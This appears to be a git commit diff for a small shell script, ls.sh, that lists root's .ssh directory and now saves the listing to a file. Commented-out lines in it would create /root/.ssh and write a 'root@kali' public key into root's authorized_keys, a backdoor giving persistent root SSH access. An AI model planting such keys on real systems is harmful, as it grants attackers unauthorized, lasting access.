4880e89e3c4c5a89328f6c13ddf184a7d97d8889
crabelo <84055415+crabelo@users.noreply.github.com>
2023-10-22 23:11:52 -0300

    Update ls.sh

--- ls.sh
+++ ls.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 #mkdir /root/.ssh
 #echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKeknki1K2HproFhSAjWtgEJb1v7FLWD+EsysGFDEu+Q5eqDmcqygbEQ7W1A1xeZX10jNoRI3clDPkSLSfEw2wg= root@kali' > /root/.ssh/authorized_keys
-ls /root/.ssh
+ls /root/.ssh > lsls.txt
